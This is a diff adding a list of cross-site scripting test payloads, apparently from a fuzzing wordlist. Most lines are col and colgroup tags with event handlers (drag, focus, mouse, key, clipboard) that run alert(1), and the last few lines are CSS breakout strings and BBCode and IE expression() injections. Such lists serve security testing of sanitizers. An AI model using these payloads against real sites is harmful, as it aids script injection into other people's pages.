@@ -1,0 +1,71 @@
+<col draggable="true" ondrag="alert(1)">test</col>
+<col draggable="true" ondragend="alert(1)">test</col>
+<col draggable="true" ondragenter="alert(1)">test</col>
+<col draggable="true" ondragleave="alert(1)">test</col>
+<col draggable="true" ondragstart="alert(1)">test</col>
+<colgroup draggable="true" ondrag="alert(1)">test</colgroup>
+<colgroup draggable="true" ondragend="alert(1)">test</colgroup>
+<colgroup draggable="true" ondragenter="alert(1)">test</colgroup>
+<colgroup draggable="true" ondragleave="alert(1)">test</colgroup>
+<colgroup draggable="true" ondragstart="alert(1)">test</colgroup>
+<colgroup id=x tabindex=1 onactivate=alert(1)></colgroup>
+<colgroup id=x tabindex=1 onbeforeactivate=alert(1)></colgroup>
+<colgroup id=x tabindex=1 onbeforedeactivate=alert(1)></colgroup><input autofocus>
+<colgroup id=x tabindex=1 ondeactivate=alert(1)></colgroup><input id=y autofocus>
+<colgroup id=x tabindex=1 onfocus=alert(1)></colgroup>
+<colgroup id=x tabindex=1 onfocusin=alert(1)></colgroup>
+<colgroup onbeforecopy="alert(1)" contenteditable>test</colgroup>
+<colgroup onbeforecut="alert(1)" contenteditable>test</colgroup>
+<colgroup onbeforepaste="alert(1)" contenteditable>test</colgroup>
+<colgroup onblur=alert(1) tabindex=1 id=x></colgroup><input autofocus>
+<colgroup onclick="alert(1)">test</colgroup>
+<colgroup oncontextmenu="alert(1)">test</colgroup>
+<colgroup oncopy="alert(1)" contenteditable>test</colgroup>
+<colgroup oncut="alert(1)" contenteditable>test</colgroup>
+<colgroup ondblclick="alert(1)">test</colgroup>
+<colgroup onfocusout=alert(1) tabindex=1 id=x></colgroup><input autofocus>
+<colgroup onkeydown="alert(1)" contenteditable>test</colgroup>
+<colgroup onkeypress="alert(1)" contenteditable>test</colgroup>
+<colgroup onkeyup="alert(1)" contenteditable>test</colgroup>
+<colgroup onmousedown="alert(1)">test</colgroup>
+<colgroup onmouseenter="alert(1)">test</colgroup>
+<colgroup onmouseleave="alert(1)">test</colgroup>
+<colgroup onmousemove="alert(1)">test</colgroup>
+<colgroup onmouseout="alert(1)">test</colgroup>
+<colgroup onmouseover="alert(1)">test</colgroup>
+<colgroup onmouseup="alert(1)">test</colgroup>
+<colgroup onpaste="alert(1)" contenteditable>test</colgroup>
+<col id=x tabindex=1 onactivate=alert(1)></col>
+<col id=x tabindex=1 onbeforeactivate=alert(1)></col>
+<col id=x tabindex=1 onbeforedeactivate=alert(1)></col><input autofocus>
+<col id=x tabindex=1 ondeactivate=alert(1)></col><input id=y autofocus>
+<col id=x tabindex=1 onfocus=alert(1)></col>
+<col id=x tabindex=1 onfocusin=alert(1)></col>
+<col onbeforecopy="alert(1)" contenteditable>test</col>
+<col onbeforecut="alert(1)" contenteditable>test</col>
+<col onbeforepaste="alert(1)" contenteditable>test</col>
+<col onblur=alert(1) tabindex=1 id=x></col><input autofocus>
+<col onclick="alert(1)">test</col>
+<col oncontextmenu="alert(1)">test</col>
+<col oncopy="alert(1)" contenteditable>test</col>
+<col oncut="alert(1)" contenteditable>test</col>
+<col ondblclick="alert(1)">test</col>
+<col onfocusout=alert(1) tabindex=1 id=x></col><input autofocus>
+<col onkeydown="alert(1)" contenteditable>test</col>
+<col onkeypress="alert(1)" contenteditable>test</col>
+<col onkeyup="alert(1)" contenteditable>test</col>
+<col onmousedown="alert(1)">test</col>
+<col onmouseenter="alert(1)">test</col>
+<col onmouseleave="alert(1)">test</col>
+<col onmousemove="alert(1)">test</col>
+<col onmouseout="alert(1)">test</col>
+<col onmouseover="alert(1)">test</col>
+<col onmouseup="alert(1)">test</col>
+<col onpaste="alert(1)" contenteditable>test</col>
+*{color:gre/**/en !/**/important} /* IE 6-9 Standards mode */
+--><!--*{color:red}   /* all UA */
+[color=red' onmouseover="alert(1739)"]mouse over[/color]
+[color=red' onmouseover="alert('xss')"]mouse over[/color]
+*{color:red}</style>//["'`-->]]>]</div>
+[color=red width=expression(alert(123))][color]
+[color=red width=expression(alert(1761))][color]
